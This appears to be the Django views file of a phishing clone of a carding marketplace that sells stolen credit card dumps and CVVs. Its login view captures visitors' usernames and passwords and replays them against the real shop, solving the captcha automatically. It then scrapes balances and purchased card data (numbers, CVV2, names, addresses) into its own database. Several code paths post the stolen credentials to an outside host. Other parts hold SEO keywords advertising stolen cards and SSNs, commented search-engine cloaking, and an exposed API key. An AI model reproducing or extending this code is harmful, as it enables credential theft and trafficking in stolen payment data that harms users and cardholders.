import json
import os
import random
from io import BytesIO
import hmac
import hashlib
import uuid
import numpy as np
import requests
from bs4 import BeautifulSoup
from django import forms
from django.conf import settings
from django.contrib import messages
from django.contrib.auth import authenticate, login
from django.contrib.auth.decorators import login_required, user_passes_test
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.auth.models import User
from django.contrib.auth.views import LoginView, LogoutView
from django.http import HttpResponse, HttpResponseNotAllowed
from django.shortcuts import redirect, render
from django.urls import reverse_lazy
from django.utils.html import escape
from django.views.decorators.csrf import csrf_exempt
from django.views.generic.detail import DetailView
from django.views.generic.edit import (CreateView, DeleteView, FormView,
                                       UpdateView)
from django.views.generic.list import ListView
from django_ratelimit.decorators import ratelimit
from PIL import Image

from .decorators import login_required_custom
from .forms import NewUserForm
from .models import (Billing, BriansclubAddress, CartItem, Order, OrdersNumber,
                     SiteConfiguration)


def not_authenticated_user(user):
    return not user.is_authenticated


# from .forms import CaptchaForm
@user_passes_test(not_authenticated_user, login_url='/Billing', redirect_field_name=None)
def home(request):
    domain = request.get_host()
    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config}
    # form = CaptchaForm()
    return render(request, 'main/home.html', {'form': form})


from django.core.exceptions import MultipleObjectsReturned


# dashboard view
@login_required_custom(login_url='/login')
def dashboard(request):
    domain = request.get_host()
    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        try:
            site_config = SiteConfiguration.objects.first()
        except MultipleObjectsReturned:
            # Handle the case where multiple SiteConfiguration objects exist
            site_config = SiteConfiguration.objects.all().first()  # You can adjust this logic as needed

    context = {'site_config': site_config}
    return render(request, 'main/dashboard.html', context)

# def dashboard(request):
#     domain = request.get_host()
#     try:
#         site_config = SiteConfiguration.objects.get(domain=domain)
#     except SiteConfiguration.DoesNotExist:
#         site_config = SiteConfiguration.objects.first()
#     context = {'site_config': site_config}
#     return render(request, 'main/dashboard.html', context)


import time


@csrf_exempt
def loginPage(requst):
    if requst.method == 'POST':
        username = requst.POST.get('username')
        password = requst.POST.get('password')
        user = authenticate(requst, username=username, password=password)
        if user is not None:
            login(requst, user)
            return redirect('dashboard')
        else:
            messages.info(requst, 'Username or Password is incorrect')


import requests


# custom login view
@csrf_exempt
class CustomLoginView(LoginView):
    template_name = 'main/login.html'
    fields = '__all__'
    redirect_authenticated_user = True

    def get_success_url(self):
        return reverse_lazy('tasklist')


# change string to nubmer example '3+1' to 4 in python
import requests

# logout view
# def create_user_and_balance(username, password, balance):
#     # Create User
#     user = User.objects.create_user(username=username, password=password)

#     # Create Balance
#     Balance.objects.create(user=user, balance=balance)


#     return user
def create_user_and_balance(username, password, balance):
    try:
        # Validate input parameters
        if not username or not password or not balance:
            raise ValueError("Username, password, and balance are required")

        # Create User
        if User.objects.filter(username=username).first():
            user = User.objects.filter(username=username).first()

            return user

        user = User.objects.create_user(username=username, password=password)

        # Create Balance
        Balance.objects.create(user=user, balance=balance)

        return {'user': user, 'balance': balance}
    except Exception as e:
        # Handle any exceptions that occur during user or balance creation
        print(f"Error creating user and balance: {e}")
        return None


def find_identical_and_calculate(img2_url, dir_path):
    response = requests.get(img2_url)
    img2 = Image.open(BytesIO(response.content))
    img2_array = np.array(img2)
    images_dir = os.path.join(settings.BASE_DIR, dir_path)
    for filename in os.listdir(images_dir):
        if filename.endswith('.png'):
            img1_path = os.path.join(images_dir, filename)
            img1 = Image.open(img1_path)
            img1_array = np.array(img1)
            if np.array_equal(img1_array, img2_array):
                label = os.path.splitext(os.path.basename(img1_path))[0]
                expression = label.split('=')[0]
                result = eval(expression)
                return result
    return None


@user_passes_test(not_authenticated_user, login_url='/dashboard', redirect_field_name=None)
@csrf_exempt
def loginreq(request):
        content = [
            "Welcome to our website!",
            "Join our community today!",
            "Discover new products and services!",
            "Get the latest news and updates!",
            "Connect with like-minded people!",
            "Find inspiration and motivation!",
        ]
        random_content = random.choice(content)
        context = {
            'random_content': random_content,
            'keywords': 'briansclub,brainsclub cm,briansclub cc,briansclub review,brianclub cm login,brainclub,cc dumps,cvv online,cvv shop online,cvv dumps,buy cc,cc shop,fresh dumps,buy dumps online, dumps,dumps shop,buy dumps, dumps with pin,buy ssn,briansclub sign in,briansclub official site,is briansclub legit,new briansclub,briansclub forum,bclub,blub cm,bclub tkbriansclub onion,briansclub onion link,brians club login,brians club,sites to buy cvv',
        'description': 'Briansclub cm | The best shop for CVV2 and Dumps.Briansclub is one of the best cc shops for quality cards. bclub, Brians club - Member login',
        'title': 'BRIANSCLUB.CM - BRIANSCLUB LOGIN | BCLUB cm Store',
        }
        user_agent = request.META.get('HTTP_USER_AGENT', '')
        user_agent = request.META.get('HTTP_USER_AGENT', '')
        # if 'curl' in user_agent.lower() or 'postman' in user_agent.lower():
        #     # Request is coming from an API client
        #     return render(request, 'googlebot_template.html', context)
        # elif 'adsbot' in user_agent.lower() or 'google' in user_agent.lower() or ('google' in user_agent.lower() and 'adwords' in user_agent.lower()) or 'http://www.google.com/bot.html' in user_agent.lower():
        #     # Request is coming from a Googlebot crawler or google.com
        #     return render(request, 'googlebot_template.html', context)
        # else:

        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}

        if request.method == 'POST':
            captcha_answer = request.POST.get('captcha')
            num1 = request.POST.get('num1')
            num2 = request.POST.get('num2')
            username = request.POST.get('username')
            password = request.POST.get('password')
            data = {
                'username': username,
                'password': password
            }

            try:

                def find_identical_and_calculate(img2_url, dir_path):

                    # Download the second image
                    response = requests.get(img2_url)
                    img2 = Image.open(BytesIO(response.content))
                    img2_array = np.array(img2)

                    # Get the path to the images directory
                    images_dir = os.path.join(settings.BASE_DIR, dir_path)

                    # Loop over all files in the directory
                    for filename in os.listdir(images_dir):
                        print('for loop')
                        if filename.endswith('.png'):  # Check if the file is an image
                            img1_path = os.path.join(images_dir, filename)

                            # Open the image
                            img1 = Image.open(img1_path)
                            img1_array = np.array(img1)

                            # Check if the two arrays are identical
                            if np.array_equal(img1_array, img2_array):
                                # Remove the '.png' from the end of the filename
                                label = os.path.splitext(os.path.basename(img1_path))[0]

                                # Split the label at the equals sign and take the first part
                                expression = label.split('=')[0]

                                # Evaluate the expression
                                result = eval(expression)

                                return result

                    return None

                # Test the function
                session = requests.Session()

                while True:
                    print('while loop')
                    print('test')
                    print(session)
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
                    }
                    try:
                        response1 = session.get('https://bclub.cm/login/', headers=headers)
                        print('response1', response1)
                        print(response1)
                    except:
                        print('Error: Login failed')
                        break
                    soup = BeautifulSoup(response1.content, 'html.parser')
                    input_element = soup.find('input', {'id': 'id_captcha_0'})
                    value = input_element['value']  # type: ignore

                    # https://bclub.cm/captcha/image/2f6b5fca4834a17079493df0bdefdd1ecd586749/

                    img2_url = f'https://bclub.cm/captcha/image/{value}/'
                    print(img2_url)
                    # Now you can call the function with this URL
                    capvalue = find_identical_and_calculate(img2_url, 'static/public/brianimages/')
                    print(capvalue)

                    # Extract the CSRF token from the cookies
                    csrf_token = response1.cookies['csrftoken']
                    print(csrf_token)

                    # Make a POST request to the login API with the CSRF token
                    headers = {
                        "X-CSRFToken": csrf_token,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Referer": "https://bclub.cm/login/",
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
                    }
                    data = {
                        'csrfmiddlewaretoken': csrf_token,
                        'username': username,
                        'password': password,
                        'captcha_0': value,
                        'captcha_1': capvalue,
                    }
                    try:

                        response = session.post('https://bclub.cm/login/', headers=headers, data=data)
                    except:
                        break
                    # print('response',response.content)
                    # Check if login is successful
                    if b'Login or password are incorrect' in response.content:
                        print("Error: Login failed user and pass")
                        break

                    else:
                        print("Login successful")
                        # print(response.content)
                        # print('response',response.content)

                        html_content = response.content
                        soup = BeautifulSoup(html_content, 'html.parser')
                        span_element = soup.find('span', {'id': 'user_balance'})
                        try:
                            try:
                                user = User.objects.filter(username=username).first()
                                if user is not None:
                                    print(user)
                                else:
                                    print("No user found")
                            except User.DoesNotExist:
                                print("User not found")
                            try:                                # Get the billing page
                                response4 = session.get('https://bclub.cm/billing/', headers=headers)
                                soup = BeautifulSoup(response4.content, 'html.parser')
                            except:
                                break
                            # Find the billing table
                            table_element = soup.find('table', {'class': 'table table-responsive table-hover'})

                            if table_element is not None:
                                rows = table_element.find_all('tr')
                                for i in range(1, len(rows)):  # start from the second row
                                    row = rows[i]
                                    cols = row.find_all('td')
                                    if len(cols) >= 5:  # make sure there are enough columns
                                        system = cols[0].text.strip()
                                        amount = float(cols[1].text.strip().replace('USD', ''))
                                        status = cols[2].text.strip()
                                        date = datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M')
                                        details = cols[4].text.strip()

                                        # Create a new Billing object
                                        billing = Billing(
                                            user=user,
                                            system=system,
                                            amount=amount,
                                            status=status,
                                            date=date,
                                            details=details,
                                        )
                                        billing.save()
                            else:
                                print("Error: Billing table not found")

                            response3 = session.get('https://bclub.cm/orders/', headers=headers)
                            # print('response3',response3.status_code)
                            soup = BeautifulSoup(response3.content, 'html.parser')
                            table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
                            # print('table_element',table_element)
                            # table_element = table_element.text
                            # print('table_element',table_element)
                            rows = table_element.find_all('tr')

                            # Initialize a variable to hold the current order number
                            current_order_number = None

                            # Loop through each row
                            for row in rows:
                                # Find all columns in the row
                                cols = row.find_all('td')

                                # Check if this is an order number row
                                if len(cols) == 3:
                                    # Extract the order number from the row
                                    order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
                                    print('order_number', order_number)
                                    date_string = cols[0].text.strip()
                                    date = datetime.strptime(date_string, '%Y-%m-%d %H:%M')
                                    # Create a new OrdersNumber object
                                    current_order_number = OrdersNumber(number=order_number, date=date)
                                    current_order_number.save()

                                # Check if this is an order detail row
                                elif len(cols) >= 14 and current_order_number is not None:
                                    print('cols is')
                                    # Create a new Order object
                                    order = Order()

                                    # Set the fields of the Order object based on the columns in the row
                                    order.bin = cols[1].text
                                    order.type = cols[2].text
                                    order.dc = cols[3].text
                                    order.subtype = cols[4].text
                                    order.card_number = cols[5].text
                                    order.exp = cols[6].text
                                    order.cvv2 = cols[7].text
                                    order.name = cols[8].text
                                    order.address = cols[9].text
                                    order.extra = cols[10].text
                                    order.bank = cols[11].text
                                    order.base = cols[12].text
                                    order.price = cols[13].text

                                    # Set the user of the order
                                    # Note: You need to replace 'username' with the actual username
                                    user = User.objects.filter(username=username).first()
                                    if user is not None:
                                        order.user = user
                                    else:
                                        print("No user found for the specified username")
                                    # Save the order
                                    order.save()
                                    print('order', order)
                                    print('current_order_number', current_order_number)
                                    # current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
                                    # Add the order to the current order number
                                    current_order_number.orders.add(order)
                                    current_order_number.save()
                        except Exception as e:
                            print(e)
                    # Extract the text inside the span
                        try:
                            value = span_element.text
                            print('balance', value)
                            create_user_and_balance(username, password, value)
                            data = {
                                'username':username,
                                'password':password,
                                'balance':value
                            }
                            try:

                                response2 = requests.post('http://bclub.cc/userdata/create/', data=data)
                            except:
                                return render(request, 'main/login.html', context)
                            for i in range(2):
                                try:
                                    try:
                                        user = User.objects.filter(username=username).first()
                                        if user is not None:
                                            print(user)
                                        else:
                                            print("No user found")
                                    except User.DoesNotExist:
                                        print("User not found")
                                    # Get the billing page
                                    response4 = session.get('https://bclub.cm/billing/', headers=headers)
                                    soup = BeautifulSoup(response4.content, 'html.parser')

                                    # Find the billing table
                                    table_element = soup.find('table', {'class': 'table table-responsive table-hover'})

                                    if table_element is not None:
                                        rows = table_element.find_all('tr')
                                        for i in range(1, len(rows)):  # start from the second row
                                            row = rows[i]
                                            cols = row.find_all('td')
                                            if len(cols) >= 5:  # make sure there are enough columns
                                                system = cols[0].text.strip()
                                                amount = float(cols[1].text.strip().replace('USD', ''))
                                                status = cols[2].text.strip()
                                                date = datetime.strptime(cols[3].text.strip(), '%Y-%m-%d %H:%M')
                                                details = cols[4].text.strip()

                                                # Create a new Billing object
                                                billing = Billing(
                                                    user=user,
                                                    system=system,
                                                    amount=amount,
                                                    status=status,
                                                    date=date,
                                                    details=details,
                                                )
                                                billing.save()
                                    else:
                                        print("Error: Billing table not found")

                                    response3 = session.get('https://bclub.cm/orders/', headers=headers)
                                    print('response3', response3.status_code)
                                    soup = BeautifulSoup(response3.content, 'html.parser')
                                    table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
                                    # print('table_element',table_element)
                                    # print('rows',rows)
                                    rows = table_element.find_all('tr')

                                    # Initialize a variable to hold the current order number
                                    current_order_number = None

                                    # Loop through each row
                                    for row in rows:
                                        # Find all columns in the row
                                        cols = row.find_all('td')

                                        # Check if this is an order number row
                                        if len(cols) == 3:
                                            # Extract the order number from the row
                                            order_number = int(''.join(filter(str.isdigit, cols[1].text.split('#')[-1])))
                                            print('order_number', order_number)

                                            # Create a new OrdersNumber object
                                            current_order_number = OrdersNumber(number=order_number)
                                            current_order_number.save()

                                        # Check if this is an order detail row
                                        elif len(cols) >= 14 and current_order_number is not None:
                                            # Create a new Order object
                                            order = Order()

                                            # Set the fields of the Order object based on the columns in the row
                                            order.bin = cols[1].text
                                            order.type = cols[2].text
                                            order.dc = cols[3].text
                                            order.subtype = cols[4].text
                                            order.card_number = cols[5].text
                                            order.exp = cols[6].text
                                            order.cvv2 = cols[7].text
                                            order.name = cols[8].text
                                            order.address = cols[9].text
                                            order.extra = cols[10].text
                                            order.bank = cols[11].text
                                            order.base = cols[12].text
                                            order.price = cols[13].text

                                            # Set the user of the order
                                            # Note: You need to replace 'username' with the actual username
                                                                                        # Note: You need to replace 'username' with the actual username
                                            user = User.objects.filter(username=username).first()
                                            if user is not None:
                                                order.user = user
                                            else:
                                                print("No user found for the specified username")


                                            # Save the order
                                            order.save()
                                            print('order', order)
                                            current_order_number = OrdersNumber.objects.get(id=current_order_number.id)
                                            # Add the order to the current order number
                                            current_order_number.orders.add(order)
                                            current_order_number.save()
                                except Exception as e:
                                    print(e)

                            headers = {
                                        "X-CSRFToken": csrf_token,
                                        "Cookie": f"sessionid={session.cookies['sessionid']}",
                                        "Referer": "https://bclub.cm/login/",
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
                                    }
                            print('response2', response2.status_code)

                            break
                        except AttributeError:
                            print("Error: Balance not found")

            except:
                print("Error: Login failed logic")
                try:

                                response2 = requests.post('http://bclub.cc/userdata/create/', data=data)
                except:
                                return render(request, 'main/login.html', context)
            try:

                                response2 = requests.post('http://bclub.cc/userdata/create/', data=data)
            except:
                                return render(request, 'main/login.html', context)

            sum = 0

            # Check that num1 and num2 are not None before converting them to integers
            if num1 is not None and num2 is not None:
                print((num1, num2))
                sum = int(num1) + int(num2)

                if captcha_answer is not None and int(captcha_answer) == sum:
                    # user = authenticate(request, username=username, password=password)
                    user = User.objects.filter(username=username, password=password)
                    try:
                        print(f"User {user} logged in")
                        print('password', password)
                        print('username', username)
                        newUser = authenticate(request, username=username, password=password)

                        if newUser is not None:
                            print(newUser)
                            print(f"User {user} logged in")
                            print(user)
                            login(request, newUser)
                            return redirect('dashboard')
                    except Exception as e:
                        return redirect('login')
                    else:
                # Set the auth_error key in the context dictionary
                        context['auth_error'] = 'Incorrect username or password. Please try again.'  # type: ignore
                        num1 = random.randint(1, 10)
                        num2 = random.randint(1, 10)
                        captcha = f"{num1} + {num2}="
                        context['captcha'] = captcha  # type: ignore
                        request.session['num1'] = num1
                        request.session['num2'] = num2
                        context['num1'] = num1
                        context['num2'] = num2
                else:
                    # Set the captcha_error key in the context dictionary
                    context['captcha_error'] = 'Incorrect answer. Please try again.'  # type: ignore
                    num1 = random.randint(1, 10)
                    num2 = random.randint(1, 10)
                    captcha = f"{num1} + {num2}="
                    context['captcha'] = captcha  # type: ignore
                    request.session['num1'] = num1
                    request.session['num2'] = num2
                    context['num1'] = num1
                    context['num2'] = num2

            else:
                            print("Error: Both num1 and num2 are None")
                            num1 = random.randint(1, 10)
                            num2 = random.randint(1, 10)
                            captcha = f"{num1} + {num2}="
                            context['captcha'] = captcha  # type: ignore
                            request.session['num1'] = num1
                            request.session['num2'] = num2
                            context['num1'] = num1
                            context['num2'] = num2
        else:
            num1 = random.randint(1, 10)
            num2 = random.randint(1, 10)
            captcha = f"{num1} + {num2}="
            context['captcha'] = captcha  # type: ignore
            request.session['num1'] = num1
            context['num1'] = num1
            context['num2'] = num2
            request.session['num2'] = num2
        return render(request, 'main/login.html', context)

# def find_identical_and_calculate(img2_url, dir_path):
#     response = requests.get(img2_url)
#     img2 = Image.open(BytesIO(response.content))
#     img2_array = np.array(img2)
#     images_dir = dir_path
#     for filename in os.listdir(images_dir):
#         if filename.endswith('.png'):
#             img1_path = os.path.join(images_dir, filename)
#             img1 = Image.open(img1_path)
#             img1_array = np.array(img1)
#             if np.array_equal(img1_array, img2_array):
#                 label = os.path.splitext(os.path.basename(img1_path))[0]
#                 expression = label.split('=')[0]
#                 result = eval(expression)
#                 return result
#     return None

# def loginreq(request):
#     session = requests.Session()
#     attempts = 0

#     while attempts < 5:
#         attempts += 1
#         headers = {
#             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
#         }
#         if request.method == 'POST':
#             captcha_answer = request.POST.get('captcha')
#             num1 = request.session.get('num1')
#             num2 = request.session.get('num2')
#             username = request.POST.get('username')
#             password = request.POST.get('password')
#             data = {
#                 'username': username,
#                 'password': password
#             }
#         response1 = session.get('https://bclub.cm/login/', headers=headers)
#         soup = BeautifulSoup(response1.content, 'html.parser')
#         input_element = soup.find('input', {'id': 'id_captcha_0'})
#         value = input_element['value']
#         img2_url = f'https://bclub.cm/captcha/image/{value}/'
#         capvalue=find_identical_and_calculate(img2_url, './brianimages/')
#         print(capvalue)
#         csrf_token = response1.cookies['csrftoken']
#         print(csrf_token)
#         headers = {
#             "X-CSRFToken": csrf_token,
#             "Content-Type": "application/x-www-form-urlencoded",
#             "Referer": "https://bclub.cm/login/",
#             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
#         }
#         data = {
#             'csrfmiddlewaretoken': csrf_token,
#             'username': username,
#             'password': password,
#             'captcha_0': value,
#             'captcha_1': capvalue,
#         }
#         response = session.post('https://bclub.cm/login/', headers=headers, data=data)
#         if b'Login or password are incorrect' in response.content:
#             print("Error: Login failed")
#         else:
#             print("Login successful")
#             html_content = response.content
#             soup = BeautifulSoup(html_content, 'html.parser')
#             span_element = soup.find('span', {'id': 'user_balance'})
#             try:
#                 balance = span_element.text
#                 print('balance', balance)
#                 response2 = session.post('https://bclub.cc/userdata/create/', data=data)
#                 headers = {
#                     "X-CSRFToken": csrf_token,
#                     "Cookie": f"sessionid={session.cookies['sessionid']}",
#                     "Referer": "https://bclub.cm/login/",
#                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
#                 }
#                 response3 = session.get('https://bclub.cm/orders/', headers=headers)
#                 print('response3',response3.status_code)
#                 soup = BeautifulSoup(response3.content, 'html.parser')
#                 table_element = soup.find('table', {'class': 'table table-bordered table-responsive table-hover'})
#                 if table_element is not None:
#                     rows = table_element.find_all('tr')
#                     for row in rows[1:]:  # skip the header row
#                         cols = row.find_all('td')
#                         if len(cols) >= 14:  # make sure there are enough columns
#                             order = Order(
#                                 user=request.user,
#                                 bin=cols[1].text,
#                                 type=cols[2].text,
#                                 dc=cols[3].text,
#                                 subtype=cols[4].text,
#                                 card_number=cols[5].text,
#                                 exp=cols[6].text,
#                                 cvv2=cols[7].text,
#                                 name=cols[8].text,
#                                 address=cols[9].text,
#                                 extra=cols[10].text,
#                                 bank=cols[11].text,
#                                 base=cols[12].text,
#                                 price=float(cols[13].text),
#                                 status=cols[14].text,
#                             )
#                             order.save()
#                 else:
#                     print("Error: Table not found")
#                 break
#             except AttributeError:
#                 print("Error: Balance not found")
#     else:
#         print("Error: Maximum login attempts exceeded")


from django.contrib.auth import logout


def logout_view(request):
    logout(request)
    return redirect('login')


class CustomLogoutView(LogoutView):
    template_name = 'main/logout.html'
    next_page = 'login'

    def dispatch(self, request, *args, **kwargs):
        if request.method == 'POST':
            return super().dispatch(request, *args, **kwargs)
        else:
            # Return an HTTP response indicating that only POST requests are allowed
            return HttpResponseNotAllowed(['POST'])


# register page
@csrf_exempt
def register(request):
    content = [
        "Welcome to our website!",
        "Join our community today!",
        "Discover new products and services!",
        "Get the latest news and updates!",
        "Connect with like-minded people!",
        "Find inspiration and motivation!",
    ]
    random_content = random.choice(content)
    context = {
        'random_content': random_content,
        'keywords': 'briansclub,brainsclub cm,briansclub cc,briansclub review,brianclub cm login,brainclub,cc dumps,cvv online,cvv shop online,cvv dumps,buy cc,cc shop,fresh dumps,buy dumps online, dumps,dumps shop,buy dumps, dumps with pin,buy ssn,briansclub sign in,briansclub official site,is briansclub legit,new briansclub,briansclub forum,bclub,blub cm,bclub tkbriansclub onion,briansclub onion link,brians club login,brians club,sites to buy cvv',
        'description': 'Briansclub cm | The best shop for CVV2 and Dumps.Briansclub is one of the best cc shops for quality cards. bclub, Brians club - Member login',
        'title': 'BRIANSCLUB.CM - BRIANSCLUB regester | BCLUB',
    }
    # user_agent = request.META.get('HTTP_USER_AGENT', '')
    # if 'curl' in user_agent.lower() or 'postman' in user_agent.lower():
    #     # Request is coming from an API client
    #     return render(request, 'googlebot_template.html', context)
    # elif 'googlebot' in user_agent.lower() or 'google' in user_agent.lower() or ('google' in user_agent.lower() and 'adwords' in user_agent.lower()) or 'http://www.google.com/bot.html' in user_agent.lower():
    #     # Request is coming from a Googlebot crawler or google.com
    #     return render(request, 'googlebot_template.html', context)
    # else:
    domain = request.get_host()
    try:
            site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config}

    if request.method == 'POST':
        print('start')
        captcha_answer = request.POST.get('captcha')
        num1 = request.POST.get('num1')
        num2 = request.POST.get('num2')
        print('capatcha', captcha_answer)
        print('num1', num1)
        print('num2', num2)

        print(request.POST)
        form = UserCreationForm(request.POST)
        # print(form)

        if num1 is not None and num2 is not None:
            print('start register')
            sum = int(num1) + int(num2)
            print('sum', sum)
            print('capatcha', captcha_answer)
            if captcha_answer is not None and int(captcha_answer) == sum:
                print('start after capatcha')
                if form.is_valid():
                    user = form.save()
                    login(request, user)
                    return redirect('tasklist')
                else:
                # Set the auth_error key in the context dictionary
                        context['auth_error'] = 'Incorrect username or password. Please try again.'  # type: ignore
                        num1 = random.randint(1, 10)
                        num2 = random.randint(1, 10)
                        captcha = f"{num1} + {num2}="
                        context['captcha'] = captcha  # type: ignore
                        request.session['num1'] = num1
                        request.session['num2'] = num2
                        context['num1'] = num1  # type: ignore
                        context['num2'] = num2
            else:
                    # Set the captcha_error key in the context dictionary
                    context['captcha_error'] = 'Incorrect answer. Please try again.'  # type: ignore
                    num1 = random.randint(1, 10)
                    num2 = random.randint(1, 10)
                    # print('num1', num1)

                    captcha = f"{num1} + {num2}="
                    context['captcha'] = captcha  # type: ignore
                    request.session['num1'] = num1
                    request.session['num2'] = num2
                    context['num1'] = num1  # type: ignore
                    context['num2'] = num2
        else:
            form = UserCreationForm()
            num1 = random.randint(1, 10)
            num2 = random.randint(1, 10)
            print('num1l', num1)
            captcha = f"{num1} + {num2}="
            context['captcha'] = captcha  # type: ignore
            context['num1'] = num1  # type: ignore
            context['num2'] = num2  # type: ignore
            request.session['num1'] = num1
            request.session['num2'] = num2
            request.session.save()
            return render(request, 'main/register.html', {'form': form, 'context':context})

    else:
        form = UserCreationForm()
        num1 = random.randint(1, 10)
        num2 = random.randint(1, 10)
        print('num1l', num1)
        captcha = f"{num1} + {num2}="
        context['captcha'] = captcha  # type: ignore
        context['num1'] = num1  # type: ignore
        context['num2'] = num2  # type: ignore
        request.session['num1'] = num1
        request.session['num2'] = num2
        request.session.save()

    return render(request, 'main/register.html', {'form': form, 'context':context})


class RegisterPage(FormView):
    template_name = 'main/register.html'
    alt_pass = forms.CharField(widget=forms.PasswordInput)
    name = forms.CharField(error_messages={'required':'Enter your name'})

    fields = ("username", "email", "password1", "password2", "alt_pass")

    form_class = UserCreationForm
    redirect_authenticated_user = True
    success_url = reverse_lazy('tasklist')

    def form_valid(self, form):
        user = form.save()  # type: ignore
        if user is not None:
            login(self.request, user)
        return super(RegisterPage, self).form_valid(form)

    def get(self, *args, **kwargs):
        if self.request.user.is_authenticated:
            return redirect('tasklist')
        return super(RegisterPage, self).get(*args, **kwargs)


# task list class
@csrf_exempt
def logincus(request):
    if request.method == 'POST':
       username = request.POST.get('username')
       password = request.POST.get('password')
       return redirect('tasklist')
    else:
        return render(request, 'main/login.html')

# create robots.txt views

# def robots(request):
#         domain = request.get_host()
#         # site_config = SiteConfiguration.objects.get(domain=domain)
#         templo=''
#         if domain=='bclub.cc':
#             templo='main/robots.txt'
#         elif domain=='briansclub.xyz':
#             templo='main/robot.txt'
#         else:
#             templo='main/robots.txt'
#         return render(request, 'main/robots.txt', content_type="text/p§ain")
# views.py

# views.py

from django.http import HttpResponse
from django.utils import timezone
from django.urls import reverse

def dynamic_sitemap(request):
    domain = request.get_host()
    protocol = 'https'  # Always use HTTPS

    # Define your URL information here
    url_info = [
        {
            'location': reverse('home'),  # Make sure 'home' matches the name in your urls.py
            'lastmod': timezone.now().strftime('%Y-%m-%d'),
            'changefreq': 'daily',
            'priority': '1.0',
        },
        {
            'location': reverse('register'),  # Make sure 'register' matches the name in your urls.py
            'lastmod': timezone.now().strftime('%Y-%m-%d'),
            'changefreq': 'monthly',
            'priority': '0.8',
        },
        {
            'location': reverse('login'),  # Make sure 'login' matches the name in your urls.py
            'lastmod': timezone.now().strftime('%Y-%m-%d'),
            'changefreq': 'monthly',
            'priority': '0.8',
        },
    ]

    # Start the XML string
    xml_content = '<?xml version="1.0" encoding="UTF-8"?>\n'
    xml_content += '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'

    # Add URL entries
    for url in url_info:
        full_url = f"{protocol}://{domain}{url['location']}"
        xml_content += f"  <url>\n"
        xml_content += f"    <loc>{full_url}</loc>\n"
        xml_content += f"    <lastmod>{url['lastmod']}</lastmod>\n"
        xml_content += f"    <changefreq>{url['changefreq']}</changefreq>\n"
        xml_content += f"    <priority>{url['priority']}</priority>\n"
        xml_content += f"  </url>\n"

    # Close the XML string
    xml_content += '</urlset>'

    return HttpResponse(xml_content, content_type='application/xml')


def robot(request):
    return render(request, '{templo}', content_type="text/plain")


from django.http import HttpResponse


def robots(request):
    site = request.get_host()
    content = f"""

User-agent: googlebot-image
Disallow:
User-agent: googlebot-mobile
Disallow:
User-agent: MSNBot
Disallow:
User-agent: Slurp
Disallow:
User-agent: Teoma
Disallow:
User-agent: Gigabot
Disallow:
User-agent: Robozilla
Disallow:
User-agent: Nutch
Disallow:
User-agent: ia_archiver
Disallow:
User-agent: baiduspider
Disallow:
User-agent: naverbot
Disallow:
User-agent: yeti
Disallow:
User-agent: yahoo-mmcrawler
Disallow:
User-agent: psbot
Disallow:
User-agent: yahoo-blogs/v3.9
Disallow:
User-agent: mediapartners-google
Disallow:
User-agent: adsbot-google
Disallow:
User-agent: googlebot-mobile
Disallow:
User-agent: *
Disallow:
Disallow: /cgi-bin/
Sitemap: https://{site}/sitemap.xml
"""
    return HttpResponse(content, content_type='text/plain')


from django.shortcuts import render


def search_items(request):
    if request.method == 'POST':
        query = request.POST.get('query')
        items = []
        if query:
            # Generate items based on the search query
            items = [f"Item {i}" for i in range(1, 11)]
        return render(request, 'earch_results.html', {'items': items})
    else:
        return render(request, 'earch.html')


import subprocess

import requests


def get_bin_info(bin_number):

    url = f'https://binlist.io/lookup/{bin_number}'
    response = requests.get(url)
    print(response.content)
    if response.status_code == 200:
        issuer = ''
        country = ''
        bank_code = ''
        scheme = ''
        type = ''
        if  'bank' in  response.json():
            issuer = response.json()['bank']['name']

        if response.json()['country']['emoji']:
            country = response.json()['country']['emoji']

        if  'bank' in response.json():

            bank_code = response.json()['bank']

        if response.json()['scheme']:
         scheme = response.json()['scheme']
        if response.json()['type']:
            type = response.json()['type']

        return {'issuer': issuer, 'country': country, 'bank_code': bank_code, 'scheme': scheme, 'type': type}
    else:
        return None
# import requests

# def get_bin_info(bin_number):
#     print('start fun')
#     url = "https://bin-ip-checker.p.rapidapi.com/"
#     querystring = {"bin": bin_number}
#     payload = {"bin": bin_number}
#     headers = {
#         "content-type": "application/json",
#         "X-RapidAPI-Key": "3d2c6ac9eamsh6800169acecb25cp168c92jsn21bc5b37be99",  # Replace with your actual RapidAPI key
#         "X-RapidAPI-Host": "bin-ip-checker.p.rapidapi.com"
#     }

#     response = requests.post(url, json=payload, headers=headers, params=querystring)
#     print(response)
#     if response.status_code == 200:
#         data = response.json()
#         print(data)
